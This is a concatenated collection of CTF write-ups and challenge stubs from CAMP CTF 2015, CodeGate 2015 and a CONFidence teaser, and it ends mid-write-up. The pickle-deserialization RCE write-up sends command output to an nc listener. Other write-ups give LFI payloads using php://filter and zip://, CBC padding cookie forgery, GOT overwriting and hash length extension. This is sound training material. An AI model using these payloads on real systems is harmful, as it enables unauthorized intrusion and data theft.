1
Listing 0 passwords:
---
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
2
Enter name of the site: www.secret.com
Enter password: secreter
Password successfully added.
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 1 passwords:
www.secret.com: secreter
---
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
4
Your backup: eJzTSCkw4ApWLy8v1ytOTS5KLdFLzs9V5yowBApCBFKLgFwjrmI9AC0+DWg=

Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
3
Enter name of the site which should be deleted: www.secret.com
Entry successfully deleted.
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 0 passwords:
---
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
5
Paste your backup here: eJzTSCkw4ApWLy8v1ytOTS5KLdFLzs9V5yowBApCBFKLgFwjrmI9AC0+DWg=
Successfully restored 1 entries
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 1 passwords:
www.secret.com: secreter
---
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
```

We can list, add and remove passwords to sites as well as backup and restore them.

The site-password key-value pairs are stored in an dictionary named `entries`.

The vulnerability lies in the `spam_backup` and `spam_restore` functions.

When a user decides to backup data, `pickle` is first used to serialize the data using `pickle.dumps`, `zlib` then compresses the data and the data finally is base64 encoded and sent to the user.
When restoring backup data, the data provided by the user is base64 decoded, decompressed using `zlib` and finally deserialized using `pickle.loads`.

However, as shown in [this blog post](https://blog.nelhage.com/2011/03/exploiting-pickle/), `pickle.loads` calls the [`__reduce__` method of provided objects](https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types) in order to know how to deserialize (and thus ["how to pickle"](https://docs.python.org/2/library/pickle.html#object.__reduce__)) the object.

To exploit this feature, we create a class object with a `__reduce__` method that executes arbitrary commands.
As described in [nelhage's blog post](https://blog.nelhage.com/2011/03/exploiting-pickle/), the method should return "either a string or tuple describing how to reconstruct this object on unpacking". Our tuple should consist of a callable and a tuple of arguments for this callable.

E.g. if we want to execute `subprocess.Popen('/bin/sh')`, the first tuple entry will be `subprocess.Popen` while the second entry will be a tuple containing the string `/bin/sh`: `('/bin/sh',)`.

[This python script](./solve.py) does the job:

```bash
# Terminal 1, listen for a connection on your site
$ while true; do nc -l 5555; done
[...]

# Terminal 2, execute solve.py with first argument being the command to be executed
$ p solve.py 'ls'
[+] Opening connection to localhost on port 1024: Done
[*] Closed connection to localhost port 1024

# Terminal 1, see output of ls
$ while true; do nc -l 5555; done
flag.txt
spam.py
[...]

# Terminal 2, read flag.txt
$ p solve.py 'cat flag.txt'
[+] Opening connection to localhost on port 1024: Done
[*] Closed connection to localhost port 1024

# Terminal 1, see flag.txt content
[...]
flag.txt
spam.py
CAMP15_76b5fad40644ac0616b301454250c408
```

The flag is `CAMP15_76b5fad40644ac0616b301454250c408`.

PS: If you want to read more about the pickle format (e.g. print out what `pickle.dumps(entries)` generates), have a look [here](https://www.cs.uic.edu/~s/musings/pickle.html).

Some alternative solutions such as [this writeup](http://reu.org.ua/camp-ctf-2015-spam.html) or [that writeup](http://sol.logdown.com/posts/2015/08/14/campctf-2015-pwn-spam) did provide the result of the `__reduce__` method directly.

## Other write-ups and resources

* <https://github.com/vito-lbs/cccctf/tree/master/spam>
* <https://pacmans.army/?p=290>
* <http://blog.whatever.io/2015/08/18/campctf-spam100-pwn/>
* [Russian](http://reu.org.ua/camp-ctf-2015-spam.html) 
* [Chinese](http://sol.logdown.com/posts/2015/08/14/campctf-2015-pwn-spam)
# CAMP CTF write-ups

* https://campctf.ccc.ac/ 
* [Scoreboard](https://campctf.ccc.ac/scoreboard/) or [local alternative](score.txt)

## Completed write-ups

* [forensics/APT-incident-response-400](forensics/APT-incident-response-400)
* [pwn/bitterman-300](pwn/bitterman-300)
* [pwn/hacker_level-200](pwn/hacker_level-200)
* [pwn/secret_file-150](pwn/secret_file-150)
* [pwn/spam-100](pwn/spam-100)

## External write-ups only

* [pwn/datenklo-manager-300](pwn/datenklo-manager-300)
* [pwn/phobos-300](pwn/phobos-300)
* [pwn/ropcalc-225](pwn/ropcalc-225)
* [pwn/shell-300](pwn/shell-300)
* [reversing/keycheck-200](reversing/keycheck-200)
* [web/trolol-150](web/trolol-150)
* [web/voodoo-250](web/voodoo-250)
* [web/websocket-75](web/websocket-75)

## Missing write-ups

* [reversing/flagbox-200](reversing/flagbox-200)
* [reversing/flagbox-onsite-150](reversing/flagbox-onsite-150)
* [reversing/o1dar-500](reversing/o1dar-500)
* [signals/l1sten_to_the_rad1o-375](signals/l1sten_to_the_rad1o-375)# CAMP CTF 2015: flagbox-200

**Category:** Reversing
**Points:** 200
**Solves:** 10
**Description:**

> We made a simple [AVR-circuit](flagbox.png) try to extract the flag. You'll probably need this [binary](flagbox.elf).


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CAMP CTF 2015: flagbox-onsite-150

**Category:** Reversing
**Points:** 150
**Solves:** 3
**Description:**

> The [Flagbox circuit](flagbox.png) is also onsite at our location. Find a way to display the flag and visit us to get the flag. You'll probably need this [binary](flagbox_onsite.elf).


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CAMP CTF 2015: keycheck-200

**Category:** Reversing
**Points:** 200
**Solves:** 29
**Description:**

> Find valid credentials for the registration server [keycheck](keycheck) running on `challs.campctf.ccc.ac 10114`


## Write-up

(TODO)

## Other write-ups and resources

* [Russian](http://reu.org.ua/camp-ctf-2015-keycheck.html) 
* http://bannsecurity.com/index.php/home/10-ctf-writeups/14-camp-ctf-2015-keycheck
# CAMP CTF 2015: o1dar-500

**Category:** Reversing
**Points:** 500
**Solves:** 9
**Description:**

> Reverse this [rad1o l0adable](o1dar.c1d) and retrieve the flag!


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CAMP CTF 2015: l1sten_to_the_rad1o-375

**Category:** Signals
**Points:** 375
**Solves:** 3
**Description:**

> We saw a strange signal which is repeated every second on exactly 2.5GHz at the [Chaos West Village](https://www.google.de/maps/place/53%C2%B001'54.8%22N+13%C2%B018'25.0%22E/@53.0319,13.3069333,18z/data=!3m1!4b1!4m2!3m1!1s0x0:0x0).
>
> You got one of those rad1o badges. Maybe you can record the signal, find the correct demodulation and retrieve the flag.
>
> Please be in the vicinity of the given coordinates. The signal is not very strong.
>
> If you experience problems (no signal, disruption of other services due to the transmission etc.), please call Andy on his DECT number 4335.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CAMP CTF 2015: trolol-150

**Category:** Web
**Points:** 150
**Solves:** 14
**Description:**

> we couldn't get the real flag, could you ? ;)

> [Service](http://challs.campctf.ccc.ac:10119/)
>
> P.S: No Bruteforce of any kind is needed to solve the task
>
> Hints:
> admin love to eat pears


## Write-up

(TODO)

## Other write-ups and resources

* <http://khack40.info/camp-ctf-2015-trolol-web-write-up/>
# CAMP CTF 2015: voodoo-250

**Category:** Web
**Points:** 250
**Solves:** 4
**Description:**

> you might need some voodoo powers to pwn this box

> [service](http://challs.campctf.ccc.ac:10104/)


## Write-up

(TODO)

## Other write-ups and resources

* <https://pacmans.army/?p=296#more-296>
* <http://0-day.me/ctf/camp_ctf_voodoo.txt>
# CAMP CTF 2015: websocket-75

**Category:** Web
**Points:** 75
**Solves:** 22
**Description:**

> What does this [service](http://challs.campctf.ccc.ac:10116/) do? It hides a flag!


## Write-up

(TODO)

## Other write-ups and resources

* <http://bannsecurity.com/index.php/home/10-ctf-writeups/15-camp-ctf-2015-websocket>
* <https://pacmans.army/?p=280>
# CodeGate General CTF 2015: icbm

**Category:** Crypto + Pwnable
**Points:** 1000
**Solves:** 
**Description:** 

> We've lost the launch codes! And worse, we have no way of even connecting to
> the server that does have them! There's only a small backdoor^Wprogram that
> saves sample measurements still externally reachable. It's not the codes but
> it's a start. Maybe that will help you?
> 
> Server : 54.65.28.239
> Port : TCP 9991
> Binary : [http://binary.grayhash.com/885aba824d989c68e5dfaae3916f385d/sample_collector](sample_collector)
> OS : Ubuntu 14.04.1 LTS x86-64
> Libc download  : [http://binary.grayhash.com/97f12134ddb75dad40df44e16b49a171/libs.tgz](libs.tgz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/codegate2015/pwn1000-icbm/writeup.md>
* <https://rzhou.org/~ricky/codegate2015_quals/icbm>
* <http://lokalhost.pl/ctf/codegate2015/sample.py>
* <http://l4w.io/files/CTFs/codegate2015/icbm-stage1.py> and <http://l4w.io/files/CTFs/codegate2015/icbm-stage2.py>
* <http://pastebin.com/5Z21mVJt># CodeGate General CTF 2015: good-crypto

**Category:** Programming
**Points:** 500
**Solves:** TODO
**Description:** 

> Binary : [http://binary.grayhash.com/bd24de5d345c0d1da274fcd7d9a2b244/file.xz](file.xz)
> We recently intercepted some kind of encrypted traffic, can you help us recover the password?
> 
> Update: Due to a crappy javascript programmer there's one line of code missing, but I'm sure you can figure out which one

## Write-up

(TODO)

## Other write-ups and resources

* <http://vnsecurity.net/ctf%20-%20clgt%20crew/2015/03/16/codegate-good-crypto.html>
* <http://www.mathyvanhoef.com/2015/03/codegate-2015-goodcrypto-advanced-wep.html>
* <https://github.com/pwning/public-writeup/blob/master/codegate2015/prog500-goodcrypto/writeup.md>
* <http://pastebin.com/nGgKQExa>
# CodeGate General CTF 2015: beef_steak

**Category:** Pwnable
**Points:** 400
**Solves:** TODO
**Description:** 

> - Binary : [http://binary.grayhash.com/6c5c199232567d00314a684d0123b11c/steak](steak)
> - Server : 54.64.101.236
> - Port : TCP 8888
> - OS : Ubuntu 14.04.2 LTS x86-64
> Just overflow.

## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/6DybHQT8># CodeGate General CTF 2015: Bookstore

**Category:** Pwnable
**Points:** 400
**Solves:** TODO
**Description:** 

> - Binary : [http://binary.grayhash.com/7692931e710c1d805224c44ab97ddd52/bookstore](bookstore)
> - Server : 54.65.201.110
> - Port : TCP 31337
> - Flag Path : /home/bookstore/key

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/codegate2015/pwn400-bookstore/bookstore.md>
* [GoN (Korean)](http://gon.kaist.ac.kr/?p=858)
* <http://lokalhost.pl/ctf/codegate2015/book.py>
* <https://gist.github.com/eboda/1f5a8b2e29afaf0a9df1>
* <http://l4w.io/files/CTFs/codegate2015/bookstore.py>
* <http://mangoplzz.tumblr.com/post/115558671967/codegate-2015-bookstore-writeup>
# CodeGate General CTF 2015: Mashed Potato

**Category:** Pwnable
**Points:** 600
**Solves:** TODO
**Description:** 

> - Binary : [http://binary.grayhash.com/b5a0bd1e466f2884d537859a8c0e754a/mashed.zip](mashed.zip)
> - Server : 54.178.148.88
> - Port : TCP 8888
> - OS : Ubuntu 14.04.2 LTS x86-64
> Leave your message.

## Write-up

(TODO)

## Other write-ups and resources

* <https://kitctf.de/writeups/codegate2015/potato/>
* <https://github.com/pwning/public-writeup/blob/master/codegate2015/pwn600-mashed_potato/writeup.md>
* <http://lokalhost.pl/ctf/codegate2015/mash.py>
* <http://l4w.io/files/CTFs/codegate2015/mashed.py>
# CodeGate General CTF 2015: Olive and Mushroom Pizza

**Category:** Pwnable
**Points:** 800
**Solves:** TODO
**Description:** 

> - Server : 54.178.148.88
> - Port : 7547
> - OS : Ubuntu 14.04.2 LTS x86-64
> - Flag : in /home/oam/
> - Binary : [http://binary.grayhash.com/78db24cd57e5d3c71c15fe9249297ed8/oam.zip](oam.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://filedu.mp/2bb128905bd56d8c/write-up.txt>
* <http://filedu.mp/2bb128905bd56d8c/exploit.c> and <http://filedu.mp/2bb128905bd56d8c/win.txt>
# CodeGate General CTF 2015: Rodent

**Category:** Pwnable + Sandbox
**Points:** 800
**Solves:** TODO
**Description:** 

> I found some ancient file server, can you have a look?
> Server : 54.178.144.54
> Port : TCP 7777
> 
> -- add
> We have added a new binary for the second stage of rodent,
> hopefully this one should be a little easier to talk to.   
> The challenge could probably have been solved even without
> this fix, but just to be sure we added ~sandbucket/sandbucket_new.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/codegate2015/pwn800-rodent/writeup.md>
* <https://rzhou.org/~ricky/codegate2015_quals/rodent/># CodeGate General CTF 2015: Sokoban

**Category:** Pwnable
**Points:** 1000
**Solves:** TODO
**Description:** 

> Binary : [http://binary.grayhash.com/2119d600d79a81bcfeca15676446bcc4/soko](soko)
> Server : gate.grayhash.com
> Port : TCP 12345 (telnet gate.grayhash.com 12345)
> OS : Ubuntu 14.04.2 LTS x86-64
> Env : /lib/x86_64-linux-gnu/libc-2.19.so
> 	/lib/x86_64-linux-gnu/ld-2.19.so
> Flag : /home/soko/flag

## Write-up

by [0xddaa](https://github.com/0xddaa)

The problem is a game that called **sokoban**. lol  
After we pass the 0 ~ 5 levels, we will enter a menu and choose the game mode.  

The menu looks like:  

> 1. Go to random infinite challenge mode
> 2. Go to next stage

Next, we opened ida pro and reverse the binary.  
We can easily see the code like:  

```
if (playgame() == 1)
    get_flag();
puts(s);
return;
```

Then we traced how the return value assigned......  
```
// just pseudo code
if (win)
  passed++;
return (passed == 228) ? 2 : 0;
```
228 is the amount of level.  
It seems impossible to arrive `get_flag()`. XD  
But our goal is very clear, **control the EIP and go to `get_flag()`**.  

We inadvently found the game sometimes generate a blank map in random mode.  
Then checking the rule of movement, it restrict the character by the element in the map, not the size of map.  
Therefore, once we get the blank map, we can move the character to anyware in **bss segment** and **GOT segment**.  

There is a defination of element:  

- \x00: nothing
- \x01: destination of box
- \x02: wall
- other: it's not important.

According the rule of sokoban, we can push a byte onto \x00 or \x01.  
It's very difficult to use......  
I try to move the content of GOT at first, but I found GOT looks like:  

> <time@got.plt>:        0xf7ffafa0      0x00007fff      0x00400dd6      0x00000000  
> <wgetch@got.plt>:      0xf7bc2f90      0x00007fff      0x00400df6      0x00000000  
> <noecho@got.plt>:      0xf7bc0a50      0x00007fff      0x00400e16      0x00000000  
> <wmove@got.plt>:       0xf7bc4e40      0x00007fff      0xf799de70      0x00007fff  
> <mvprintw@got.plt>:    0xf7bc7db0      0x00007fff      0xf7bc0ad0      0x00007fff  

Almost all byte are adjacent to each other.  
Therefore, we can't change the GOT area at most situation except ASLR was enable.  
For example, it's possible to appear the libc address likes **0x7fffff00xx**.  
So we can modify a byte on GOT to somewhere in libc.  

It seem useless....  
But after I check all possible gadgets, I found a magic gadget at **0x3e260**.  
That is `add rsp, 0x28; (pop XX)*6; ret`.  
And the address of `rand()` is **0x3d060**.  
If we modify `rand()` to magic gadget, the return address is **0x401a9a** after we execute `rand()` again.  
Luckily, there are a hidden function in the game.  
If we press `v`, it will add 0x12 on **0x60c120**.  
And, 0x3e260 - 0x3d060 = 0x12......  

So, we have already bypassed the action of assign value to EAX.  
If we can control EAX and set EAX=1, we can enter the function `get_flag()`.  
Lucklily, if the argument of wgetch is \x00, the return value will be 1.  
At x86 architecture, the return value will store in EAX.  
EAX won't be modified until call `rand()`.  
Until here, the program will print the flag. :)  

flag: `WH0n in OOme, ZZ as 12e RolanS`  


## Other write-ups and resources

* <https://github.com/0xddaa/blog/blob/master/content/2015/codegate-pwn-1000-sokoban.md>
* [Chinese](http://winesap.logdown.com/posts/257682-codegate-ctf-preliminary-2015)
* <http://pastebin.com/CZR6H3VY>
# CodeGate General CTF 2015: Systemshock

**Category:** Pwnable
**Points:** 200
**Solves:** TODO
**Description:** 

> Login : ssh systemshock@54.65.236.17
> Password : systemshocked

## Write-up

(TODO)

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/03/codegate-2015-system-shock-pwnable.html>
* <https://github.com/pwning/public-writeup/blob/master/codegate2015/pwn200-systemshock/writeup.md>
* <https://rzhou.org/~ricky/codegate2015_quals/systemshock/sol.txt>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CODEGATE/pwnable/systemshock>
* <http://capturetheswag.blogspot.de/2015/03/codegate-2015-system-shock-pwnable.html>
* [Korean](http://cd80.tistory.com/64)
* [Korean](http://err0rless313.tistory.com/entry/CODEGATE-2015-JUNIOR-SYSTEMSHOCK)
* [Korean](http://yum3.tistory.com/18)
# CodeGate General CTF 2015: Weff

**Category:** Pwnable
**Points:** 1000
**Solves:** TODO
**Description:** 

> Binary : [http://binary.grayhash.com/e1eaa1bc21a7652e923023fda5f0be16/weff.zip](weff.zip)
> Server : 54.64.74.49
> Port : TCP 6666
> Do you have time to betatest our new website?
> You can reach it through the weffproxy at 54.64.74.49:6666.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/codegate2015/pwn1000-weff/writeup.md>
* <https://rzhou.org/~ricky/codegate2015_quals/weff/># CodeGate General CTF write-ups

* <http://general.grayhash.com/html/Main.html?lang=eng>
* [Scoreboard](http://general.grayhash.com/html/Main.html?page=rank) or [here](scoreboard.txt)
* [Number of solves per task](solves.txt)

## Completed write-ups

* [pwnable/sokoban](pwnable/sokoban)
* [web/owltube](web/owltube)
* [web/owlur](web/owlur)

## External write-ups only

* [crypto/icbm](crypto/icbm)
* [programming/good-crypto](programming/good-crypto)
* [pwnable/beef-steak](pwnable/beef-steak)
* [pwnable/bookstore](pwnable/bookstore)
* [pwnable/mashed-potato](pwnable/mashed-potato)
* [pwnable/olive-and-mushroom-pizza](pwnable/olive-and-mushroom-pizza)
* [pwnable/rodent](pwnable/rodent)
* [pwnable/systemshock](pwnable/systemshock)
* [pwnable/weff](pwnable/weff)
* [reversing/arc4-stranger](reversing/arc4-stranger)
* [reversing/dodocrackme2](reversing/dodocrackme2)
* [reversing/oemu](reversing/oemu)
* [reversing/pirate-danbi](reversing/pirate-danbi)
* [trick/guesspw](trick/guesspw)

## Missing write-ups# CodeGate General CTF 2015: ARC4 Stranger

**Category:** Reversing
**Points:** 1000
**Solves:** TODO
**Description:** 

> - Binary : [http://binary.grayhash.com/81b3076ab8cc4c65deeff3ecb67904a3/arc4_stranger](arc4_stranger)
> - Download Only

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/codegate2015/rev1000-arc4_stranger/writeup.md># CodeGate General CTF 2015: dodocrackme2

**Category:** Reversing
**Points:** 400
**Solves:** TODO
**Description:** 

> Binary : [http://binary.grayhash.com/7a8a6f412013a9f99a3b911fad81a7e1/dodocrackme2.apk](dodocrackme2.apk)
> Download Only

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.0ops.net/blog/2015/03/17/codegate-2015-dodocrackme2/>
* <http://loccs.sjtu.edu.cn/~evermars/blog/2015/03/17/dodocrackme2_writeup/># CodeGate General CTF 2015: oemu

**Category:** Reversing + Pwnable
**Points:** 1000
**Solves:** TODO
**Description:** 

> Binary : [http://binary.grayhash.com/e076e0b387b0c6861422042048dbd35f/oemu](oemu)
> Server : gate.grayhash.com
> Port : TCP 30333
> OS : Ubuntu 14.04.2 LTS x86-64
> Env : /lib/x86_64-linux-gnu/libc-2.19.so
> /lib/x86_64-linux-gnu/ld-2.19.so
> Flag : /home/oemu/flag

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/codegate2015/pwn1000-oemu/writeup.md># CodeGate General CTF 2015: Pirate Danbi

**Category:** Reversing
**Points:** 1000
**Solves:** TODO
**Description:** 

> Binary: [http://binary.grayhash.com/c46a02c63c233dd9c62cececff9f52b5/pirate_danbi](pirate_danbi)
> MD5SUM of priate_danbi : ebdcfa91ae9a270ccc15230019126c6d 
> 
> Server IP: 54.65.162.169
> Port: 8888
> 
> OS: Ubuntu 14.04 (Kernel: 3.13.0-44)
> /lib/x86_64-linux-gnu/libc-2.19.so
> /lib/x86_64-linux-gnu/libbz2.so.1.0.4
> /lib/x86_64-linux-gnu/ld-2.19.so
> /lib/x86_64-linux-gnu/ld-2.19.so

## Write-up

(TODO)

## Other write-ups and resources

* <http://vnsecurity.net/ctf%20-%20clgt%20crew/2015/03/17/codegate-2015-RE1000-pirate-danbi.html>
* <https://github.com/pwning/public-writeup/blob/master/codegate2015/rev1000-pirate_danbi/writeup.md>
* <http://pastebin.com/TZiXaZmL>
* [GoN (Korean)](http://gon.kaist.ac.kr/?p=838)# CodeGate General CTF 2015: GuessPW

**Category:** Trick
**Points:** 100
**Solves:** TODO
**Description:** 

> Login : ssh user@54.92.25.127
> Login : ssh user@54.65.248.131
> Password : cguser
> 
> People kept stealing our flags, so we had our engineers implement a foolproof protection system.
> 
> NOTE : no bruteforce required, take it easy

## Write-up

(TODO)

## Other write-ups and resources

* <https://0x1337seichi.wordpress.com/2015/03/15/codgate-2015-ctf-guesspw-writeup-trick-100/>
* <https://ctf-team.vulnhub.com/codegate-2015-guesspw/>
* <https://github.com/pwning/public-writeup/blob/master/codegate2015/trick100-guesspw/writeup.md>
* [Korean](http://cd80.tistory.com/64)
* [GoN (Korean)](http://gon.kaist.ac.kr/?p=829)# CodeGate General CTF 2015: Owltube

**Category:** Web
**Points:** 400
**Solves:** TODO
**Description:** 

> You're welcome to betatest our new social media site, it's going to be the next big thing.
> 
> Server : http://54.64.164.100:5555/
> Script : [http://binary.grayhash.com/2a0182588cf5550cebb49876d94c7a2f/index.py](index.py)
> 
> - option : please check the notice board.

## Write-up

by [stypr](https://github.com/stypr)

The database seemed to be truncated every 15 minutes or so, and you can find out that the 'admin' username is taken whenever the database gets truncated.

The best possible case could be to try a sql injection based on the functionality of mongodb and python.
By reading the `index.py` script given from the ctf, you can see that the script encrypts the `auth` param in the cookie with AES-CBC encryption, which is vulnerable to padding attacks.

Moreover, if we think about the code `user = g.db.users.find_one(get_cookie())` and the outline of how mongodb works,
we can actually remove the password parameter and let the cookie have the username only in it.

The example is desribed as shown in below:
```
python: {"u":"username", "pw":"stypr"}
mongodb: SELECT * FROM (unknown) WHERE u='username' and pw='stypr'

python: {"u":"username"}
mongodb: SELECT * FROM (unknown) WHERE u='username'
```

Based on the things we kept in our mind, we just need to make the auth cookie to have `{"u":"admin"}\x03\x03\x03` as the plaintext, in order to be authenticated as admin.

```
- cbc padding vulnerability
    $ python
    ... (stripped - it does "plaintext xor iv xor fake_text" to create a fake iv) ...
    >>> print(base64.b64encode(malformed_iv+original_data))
        2zSNdk462MFkrqqwXK1Uut9d81nyZ7RGbV2q7PDX4uo=

- setting up the cookie (put this on a javascript console)
    document.cookie="auth=2zSNdk462MFkrqqwXK1Uut9d81nyZ7RGbV2q7PDX4uo;"

- the http response
    <h2>Logged in as admin</h2> 
    ...
    <span class="badge badge-important">1</span><span class="btn btn-link" onclick="play('the_owls_are_watching_again')">THIS IS THE KEY</span></br></br>
```


## Other write-ups and resources

* <https://0x1337seichi.wordpress.com/2015/03/15/codgate-2015-ctf-quals-owltube-writeup-web-400/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/CODEGATE/web/owltube/README.md>
* <https://github.com/pwning/public-writeup/blob/master/codegate2015/web400-owltube/writeup.md>
# CodeGate General CTF 2015: Owlur

**Category:** Web
**Points:** 200
**Solves:** TODO
**Description:** 

> http://54.65.205.135/owlur/
> 
> if you use a web scanner, your IP will get banned
> no bruteforce required, take it easy

## Write-up

by [stypr](https://github.com/stypr)

First of all, there is a LFI vulnerability in a GET parameter by testing parameters in the `index.php`.
As you analyze the mode parameter, you can see that the code executes in the form of `include(null_filter($var).".php");`.

At this rate, trying `php://filter` on the parameter would leak out the sourcecode of the `upload.php` and other files.
`payload: (index.php?mode=php://filter/convert.base64-encode/resource=upload)`

As we look further of how `upload.php` works,
we find out that the file checks for the extension, but does not check its contents of the uploaded file.

Based on this information, we can think about zipping the file and load the php script from the zip file.

The possible payload from this can be `index.php?mode=zip:///var/www/owlur/owlur-upload-zzzzzz/*returned_filename_from_upload_php*.jpg%23*your_real_payload*`

Through this method you will be able to list the directory and read files, and eventually let you to read the file named `OWLUR-FLAG.txt` on the `/` directory.

```
GET: index.php?zip:///var/www/owlur/owlur-upload-zzzzzz/tqpmLQ2.jpg%23stypr

Response:
owlur
pwning complete by stypr
FLAG->PHP fILTerZ aR3 c00l buT i pr3f3r f1lt3r 0xc0ffee
```


## Other write-ups and resources

* <https://0x1337seichi.wordpress.com/2015/03/15/codgate-2015-ctf-quals-owlur-writeup-web-200/>
* <http://chichou.0ginr.com/blog/1081>
* <http://dakutenpura.hatenablog.com/entry/2015/03/16/223424>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CODEGATE/web/owlur>
* <https://github.com/pwning/public-writeup/blob/master/codegate2015/web200-owlur/writeup.md># CodeGate Junior CTF 2015: return

**Category:** Misc
**Points:** 150
**Solves:** TODO
**Description:** 

> Login : ssh junior_guest@54.64.29.14
> Password : cguser
> Path : /home/return

## Write-up

(TODO)

## Other write-ups and resources

* [Korean](err0rless313.tistory.com/entry/CODEGATE-2015-JUNIOR-예선-WRITE-UP)
* [Korean](http://cd80.tistory.com/64)# CodeGate Junior CTF 2015: urandom

**Category:** Misc
**Points:** 100
**Solves:** TODO
**Description:** 

> Login : ssh junior_guest@54.64.29.14
> Password : cguser
> Path : /home/urandom

## Write-up

(TODO)

## Other write-ups and resources

* [Korean](err0rless313.tistory.com/entry/CODEGATE-2015-JUNIOR-예선-WRITE-UP)
* [Korean](http://s0ngsari.tistory.com/entry/Codegate-2015urandom)
* [Korean](http://cd80.tistory.com/64)
* <http://dakutenpura.hatenablog.com/entry/2015/03/16/202551>
# CodeGate Junior CTF 2015: cheip

**Category:** Pwnable
**Points:** 100
**Solves:** TODO
**Description:** 

> Login : ssh junior_guest@54.64.29.14
> Password : cguser
> Path : /home/cheip

## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/03/16/161102>
* <https://techshroom.github.io/2015/03/16/codegate-writeup-cheip/>
* [Korean](http://err0rless313.tistory.com/entry/CODEGATE-2015-JUNIOR-%EC%98%88%EC%84%A0-WRITE-UP)
* [Korean](http://cd80.tistory.com/64)
* [Korean](http://cfile10.uf.tistory.com/attach/274A724E550EDAB3385BD0)
* [Korean](http://cfile26.uf.tistory.com/attach/2669A33B5565B9601F2385]
* [Korean](http://cfile9.uf.tistory.com/attach/2671584E5506B29D1752CE]
# CodeGate Junior CTF 2015: shellme

**Category:** Pwnable
**Points:** 200
**Solves:** TODO
**Description:** 

> Binary : [http://binary.grayhash.com/00ef5b24573548e8fa35bfa1f01e6aef/shellme](shellme)
> Server : gate.grayhash.com
> Port : TCP 19292
> OS : Ubuntu 14.04.2 LTS x86-64
> Env : /lib/x86_64-linux-gnu/libc-2.19.so
> /lib/x86_64-linux-gnu/ld-2.19.so
> Flag : /home/shellme/flag

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CodeGate Junior CTF write-ups

* <http://junior.grayhash.com/html/Main.html?page=challenges>
* [Scoreboard](http://junior.grayhash.com/html/Main.html?page=rank) or [here](scoreboard.txt)
* [Number of solves per task](solves.txt)

## Completed write-ups

* none yet

## External write-ups only

* [misc/return](misc/return)
* [misc/urandom](misc/urandom)
* [pwnable/cheip](pwnable/cheip)

## Missing write-ups

* [programming/good-crypto](programming/good-crypto)
* [pwnable/shellme](pwnable/shellme)
* [pwnable/systemshock](pwnable/systemshock)
* [trick/guesspw](trick/guesspw)
* [web/owlur](web/owlur)# CONFidence CTF Teaser Mac Hacking 

**Category:** Crypto
**Points:** 150
**Solves:** 47
**Description:**

> They laughed at my XOR encryption. Then, they mocked me for using MD5. Hah! What do they even know. I bet they don't even code in PHP.
>
> Oh, so you think you're clever, too? Well then, Master Hacker, show me your mad skillz. Here, I'll even give you the [source code](). Go ahead, make my day.
>
> Alright, alright, there's an easier way to solve this one than we expected. The task is now worth 150 points.

## Write-up

by [HoLyVieR](https://github.com/HoLyVieR)

### Explanation

To do this challenge, we had to understand how HMAC works. HMAC is constructed using the following formula and the hash function used in the challenge was `md5`:

    HMAC(hash, data, key) = hash(key XOR (0x5c repeated 64 times) + hash(key XOR (0x36 repeated 64 times) + data))

The challenge provided us a way to know the output of this where `input` is the value we provide:

    hash(key XOR input)
	
The first step was to send the input `(0x36 repeated 64 times) + "123"`. This would give us the value `hash(key XOR (0x36 repeated 64 times) + data)` in the HMAC formula for the data `123`.

    Query: /?a=sign&m=old&d=%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36%36123
    Output: 2054441aa609e0ff20bc628190e88c40
	
But we want to get a value with data that contains `get flag` in it. So we perform a hash length extension attack using the `HashPump` tool.

    Command: hashpump -s '2054441aa609e0ff20bc628190e88c40' --data '123' -a 'get flag' -k 64
    New hash: 4d6c75e7bb5336ab5dd63d156a0e7db5
    New data: 123\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x02\x00\x00\x00\x00\x00\x00get flag
	  
The second step is to know the output of `hash(key XOR (0x5c repeated 64 times) + previous_hash)` where `previous_hash` is the value that we found in the previous step. So we do the same thing we did in the first step but with `0x5c` instead of `0x36`:

